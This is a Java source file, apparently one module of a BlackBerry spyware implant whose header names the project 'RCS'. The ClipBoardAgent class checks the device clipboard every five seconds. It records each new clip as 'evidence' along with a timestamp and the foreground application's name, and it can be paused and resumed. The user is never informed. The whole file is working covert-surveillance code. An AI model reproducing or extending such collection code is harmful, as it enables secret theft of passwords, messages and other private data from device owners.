//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : ClipBoardAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.util.Vector;

import net.rim.device.api.system.Clipboard;
import blackberry.AgentManager;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.interfaces.UserAgent;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * The Class ClipBoardAgent.
 */
public final class ClipBoardAgent extends Agent implements UserAgent {
    //#ifdef DEBUG
    static Debug debug = new Debug("ClipBoardAgent", DebugLevel.INFORMATION);
    //#endif

    static String lastClip = "";

    private boolean clipSuspended;

    /**
     * Instantiates a new clip board agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public ClipBoardAgent(final boolean agentEnabled) {
        super(Agent.AGENT_CLIPBOARD, agentEnabled, Conf.AGENT_CLIPBOARD_ON_SD,
                "ClipBoardAgent");
    }

    public static ClipBoardAgent getInstance() {
        return (ClipBoardAgent) AgentManager.getInstance().getItem(
                Agent.AGENT_CLIPBOARD);
    }

    /**
     * Instantiates a new clip board agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ClipBoardAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif
    }

    public void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public synchronized void actualRun() {
        if(clipSuspended){
            return;
        }
        String clip = (String) Clipboard.getClipboard().get();
        if (clip != null) {
            if (!clip.equals(lastClip)) {
                //#ifdef DEBUG
                debug.trace("actualRun: captured " + clip);
                //#endif
                saveEvidence(clip);
                lastClip = clip;
            }
        }
    }

    public synchronized void setClip(String clip) {
        //#ifdef DEBUG
        debug.trace("setClip: " + clip);
        //#endif
        lastClip = clip;
        clipSuspended = false;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG
        debug.trace("parse");
        //#endif
        setPeriod(5000);
        return true;
    }

    private void saveEvidence(String ret) {

        final byte[] tm = (new DateTime()).getStructTm();
        final byte[] payload = WChar.getBytes(ret.toString(), true);
        final byte[] process = WChar.getBytes(status.getCurrentForegroundAppMod(), true); //$NON-NLS-1$
        final byte[] window = WChar.getBytes(status.getCurrentForegroundAppName(), true); //$NON-NLS-1$

        final Vector items = new Vector();
        items.addElement(tm);
        items.addElement(process);
        items.addElement(window);
        items.addElement(payload);
        items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));

        evidence.atomicWriteOnce(items);

    }

    synchronized public void suspendClip() {
        clipSuspended = true;
    }

    synchronized public void resumeClip() {
        clipSuspended = false;
    }
}
